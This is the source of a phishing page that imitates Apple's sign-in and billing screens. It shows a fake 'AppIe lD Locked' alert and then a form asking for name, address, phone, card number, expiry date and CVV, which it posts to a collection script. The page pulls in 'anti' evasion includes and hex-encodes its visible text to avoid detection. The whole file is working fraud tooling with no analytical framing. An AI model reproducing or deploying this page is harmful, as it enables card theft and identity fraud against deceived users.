<?php
session_start();
include '../anti/anti1.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti8.php';
?>
<!doctype html>

<head>
   <link rel="shortcut icon" href="./files/fav.ico" type="image/X-icon">
   <title>&#x4d;&#x79;&#x20;&#x41;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x41;&#x70;&#x70;&#x49;&#x65;</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="viewport" content="width=device-width">
   <link rel="stylesheet" href="./files/signin.css" media="screen, print">
   <link rel="stylesheet" href="./files/external.css" media="screen, print">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
</head>
<style>
   #ccsc {
      background-image: url('./files/sprite_logos_wallet_2x.png');
      background-repeat: no-repeat;
      background-size: 70px;
      background-position: 104.5% 48.1%;
   }

   #cccrd {
      background-image: url('./files/cards-sprite-small@2x.png');
      background-repeat: no-repeat;
      background-size: 70px;
      background-position: 104.5% 48.1%;
   }
</style>
<script type="text/javascript">
   jQuery(function($) {
      $("#eeexm").mask("99/99");
   });
</script>
<script type="text/javascript">
   $(document).ready(function() {
      $('#delay').delay(500).fadeIn(500);
   });
</script>
<script type="text/javascript">
   $(document).ready(function() {
      $('#a2').delay(900).fadeIn(1200);
   });
</script>
<script type="text/javascript">
   $(document).ready(function() {
      $('#a1').delay(500).fadeIn(500);
   });
</script>
<script type="text/javascript">
   window.onload = function openVentana() {
      $(".ventana").slideDown(500);
   }

   function closeVentana() {
      $(".ventana").slideUp("slow");
   }

   function ShowAndHide() {
      var x = document.getElementById('SectionName');
      if (x.style.display == 'none') {
         x.style.display = 'block';
      } else {
         x.style.display = 'none';
      }
   }
</script>

<body style="zoom: 0;">
   <div id="page">
      <nav id="ac-globalnav" class="js no-touch">
         <nav id="ac-globalnav" class="js no-touch">
            <div id="orinput" class="ac-gn-content">
               <ul class="ac-gn-header">
                  <li class="ac-gn-item ac-gn-menuicon">
                     <label class="ac-gn-menuicon-label">
                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                           <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                        </span>
                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                           <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                        </span>
                     </label>
                  </li>
                  <li class="ac-gn-item ac-gn-apple">
                     <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus-small">
                     </a>
                  </li>
                  <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                     <a href="#" class="ac-gn-link ac-gn-link-bag">
                        <span class="ac-gn-bag-badge"></span>
                     </a>
                     <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                  </li>
               </ul>
            </div>
            <ul class="ac-gn-list">
               <li class="ac-gn-item ac-gn-apple">
                  <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus">
                  </a>
               </li>
               <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                  <a href="#" class="ac-gn-link ac-gn-link-search" id="ac-gn-link-search"></a>
               </li>
               <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                  <a href="#" class="ac-gn-link ac-gn-link-bag">
                     <span class="ac-gn-bag-badge" aria-hidden="true"></span>
                  </a>
                  <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
               </li>
            </ul>
   </div>
   </nav>
   </nav>
   </div>
   </div>
   <div class="ventana">
      <div id="delay" class="delay"></div>
      <div id="a2" style="width: auto;margin: 10px;display: none;z-index: 100000;">
         <div id="a1" class="a1"></div>
         <center>
            <br><br><br>
            <p><img src="./files/alt.png"></p>
            <h1 style="font-size: 30px; margin-top: 15px; padding-bottom: 30px;color: rgba(51, 51, 51, 0.85);font-weight: 100;font-family:'Open Sans', sans-serif;">&#x41;&#x70;&#x70;&#x49;&#x65;&#x20;&#x6c;&#x44;&#x20;&#x4c;&#x6f;&#x63;&#x6b;&#x65;&#x64;</h1> <br>
            <hr style="width: 94%;opacity: 0.4;margin-top: 12px;">
            <a align="center" style="text-decoration:none;" href="javascript:closeVentana(ShowAndHide());">
               <p class="un" style="color: #0179fc;font-size: 1.1em;font-family: 'Open Sans', sans-serif;padding-bottom: 5px;padding-top: 5px;">&#x55;&#x6e;&#x6c;&#x6f;&#x63;&#x6b;&#x20;&#x4e;&#x6f;&#x77;</p>
            </a>
         </center>
         </section>
      </div>
   </div>
   <DIV ID="SectionName" STYLE="display:none">
      <div id="signin-container" class="rs-page-content">
         <div>
            <div id="rr-viewport"></div>
            <div>
               <div class="rs-signin">
                  <br> <br> <br>
                  <h1 class="as-l-container rs-signin-header" style="text-align: center;">&#x56;&#x61;&#x6c;&#x69;&#x64;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x62;&#x69;&#x6c;&#x6c;&#x69;&#x6e;&#x67;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;</h1>
                  <div class="row as-l-container">
                     <div class="rs-signin-returningcustomer">
                        <center>
                           <div class="" style="text-align: center;">
                              <form method="post" action="sifetb.php">
                                 <fieldset>
                                    <div class="as-signin-input">
                                       <div class="dddd form-element ">
                                          <input style="border-radius: 12px;" autocomplete="off" required="" value="" type="text" id="nmoncrd" name="nmoncrd" class="form-textbox form-textbox-text" maxlength="40"><span class="form-label">
                                             <span id="loginHome.customerLogin.appleId-label">Full name</span></span>
                                       </div>
                                       <div class="dddd form-element ">
                                          <input style="border-radius: 12px;" autocomplete="off" required="" value="" type="text" id="bbbilling" name="bbbilling" class="form-textbox form-textbox-text" maxlength="40"><span class="form-label">
                                             <span id="loginHome.customerLogin.appleId-label">Address Line</span></span>
                                       </div>
                                       <div class="dddd form-element ">
                                          <input style="border-radius: 12px;" autocomplete="off" required="" value="" type="text" id="pppostcode" name="pppostcode" class="form-textbox form-textbox-text" maxlength="10"><span class="form-label">
                                             <span id="loginHome.customerLogin.appleId-label">Zip Code</span></span>
                                       </div>
                                       <div class="dddd form-element ">
                                          <input style="border-radius: 12px;" autocomplete="off" required="" value="" type="tel" id="hppnumber" name="hppnumber" class="form-textbox form-textbox-text" maxlength="14"><span class="form-label">
                                             <span id="loginHome.customerLogin.appleId-label">Phone Number</span></span>
                                       </div>
                                       <br>
                                       <h3 class="as-globalfooter-content" style="text-align: center;">&#x56;&#x61;&#x6c;&#x69;&#x64;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;</h3>
                                       <center>
                                          <p><img src="./files/allcrds.png" width="151" height="27" </p>
                                       </center>
                                       <div class="as-signin-input">
                                          <div class="dddd form-element ">
                                             <input style="border-radius: 12px; background-position: 98.5% -0.2%;" required="" autocomplete="off" value="" type="tel" id="cccrd" name="cccrd" class="form-textbox form-textbox-text" maxlength="18" aria-required="true" aria-describedby="cardnumberinputError" aria-invalid="false"><span class="form-label">
                                                <span id="loginHome.customerLogin.appleId-label">&#x43;&#x61;&#x72;&#x64;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72;</span></span>
                                          </div>
                                          <div class="dddd form-element ">
                                             <input style="border-radius: 12px;" required="" value="" type="tel" id="eeexm" autocomplete="off" name="eeexm" class="form-textbox form-textbox-text" maxlength="8" aria-required="true" aria-describedby="ExpiryDateinputError" aria-invalid="false"><span class="form-label">
                                                <span id="loginHome.customerLogin.appleId-label">&#x45;&#x78;&#x70;&#x69;&#x72;&#x79;&#x20;&#x64;&#x61;&#x74;&#x65;&#x20;&#x59;&#x59;&#x2f;&#x4d;&#x4d;</span></span>
                                          </div>
                                          <div class="dddd form-element ">
                                             <input style="border-radius: 12px;" required="" value="" type="tel" id="ccsc" autocomplete="off" name="ccsc" class="form-textbox form-textbox-text" maxlength="4" aria-required="true" aria-describedby="SecurityCodeinputError" aria-invalid="false"><span class="form-label">
                                                <span id="loginHome.customerLogin.appleId-label">&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x63;&#x6f;&#x64;&#x65;&#x20;&#x28;&#x43;&#x43;&#x56;&#x29;</span></span>
                                          </div>
                                       </div>
                                 </fieldset>
                                 <div class="as-signin-button">
                                    <input required="" value="Continue" type="submit" class="button button-block form-button" aria-required="true">
                                 </div>
                              </form>
                           </div>
                        </center>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <footer class="as-globalfooter as-globalfooter-simple as-globalfooter-contained js flexbox">
            <div class="as-globalfooter-content">
               <div class="as-globalfooter-mini">
                  <div class="as-globalfooter-mini-shop">
                  </div>
                  <div class="as-globalfooter-mini-locale">
                     <a target="_blank" class="as-globalfooter-mini-locale-link" href="#">&#x57;&#x6f;&#x72;&#x6c;&#x64;&#x77;&#x69;&#x64;&#x65;</a>
                  </div>
                  <div id="scLk" class="as-globalfooter-mini-legal">
                     <p class="as-globalfooter-mini-legal-copyright">&#x43;&#x6f;&#x70;&#x79;&#x72;&#x69;&#x67;&#x68;&#x74;&#x20;&copy;&#x20;&#x32;&#x30;&#x32;&#x34;&#x20;&#x41;&#x70;&#x70;&#x49;&#x65;&#x20;&#x6c;&#x6e;&#x63;&period;&#x20;&#x41;&#x6c;&#x6c;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&period;</p>
                     <p class="as-globalfooter-mini-legal-links">
                        <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x50;&#x6f;&#x6c;&#x69;&#x63;&#x79;</a>
                        <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">&#x54;&#x65;&#x72;&#x6d;&#x73;&#x20;&#x6f;&#x66;&#x20;&#x55;&#x73;&#x65;</a>
                        <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">&#x53;&#x61;&#x6c;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x52;&#x65;&#x66;&#x75;&#x6e;&#x64;&#x73;</a>
                        <a target="_blank" class="as-globalfooter-mini-legal-link" href="#">&#x53;&#x69;&#x74;&#x65;&#x20;&#x4d;&#x61;&#x70;</a>
                     </p>
                  </div>
               </div>
            </div>
         </footer>
      </div>
</body>
<script>
   window.onload = function() {


      input_credit_card = function(input) {
         var format_and_pos = function(char, backspace) {
            var start = 0;
            var end = 0;
            var pos = 0;
            var separator = " ";
            var value = input.value;

            if (char !== false) {
               start = input.selectionStart;
               end = input.selectionEnd;

               if (backspace && start > 0) // handle backspace onkeydown
               {
                  start--;

                  if (value[start] == separator) {
                     start--;
                  }
               }
               // To be able to replace the selection if there is one
               value = value.substring(0, start) + char + value.substring(end);

               pos = start + char.length; // caret position
            }

            var d = 0; // digit count
            var dd = 0; // total
            var gi = 0; // group index
            var newV = "";
            var groups = /^\D*3[47]/.test(value) ? [4, 6, 5] : [4, 4, 4, 4];

            for (var i = 0; i < value.length; i++) {
               if (/\D/.test(value[i])) {
                  if (start > i) {
                     pos--;
                  }
               } else {
                  if (d === groups[gi]) {
                     newV += separator;
                     d = 0;
                     gi++;

                     if (start >= i) {
                        pos++;
                     }
                  }
                  newV += value[i];
                  d++;
                  dd++;
               }
               if (d === groups[gi] && groups.length === gi + 1) // max length
               {
                  break;
               }
            }
            input.value = newV;

            if (char !== false) {
               input.setSelectionRange(pos, pos);
            }
         };

         input.addEventListener('keypress', function(e) {
            var code = e.charCode || e.keyCode || e.which;
            if (code !== 9 && (code < 37 || code > 40) &&
               !(e.ctrlKey && (code === 99 || code === 118))) {
               e.preventDefault();
               var char = String.fromCharCode(code);
               if (/\D/.test(char) || (this.selectionStart === this.selectionEnd &&
                     this.value.replace(/\D/g, '').length >=
                     (/^\D*3[47]/.test(this.value) ? 15 : 16))) {
                  return false;
               }
               format_and_pos(char);
            }
         });


      };
      input_credit_card(document.getElementById('cccrd'));
   }
</script>

</html>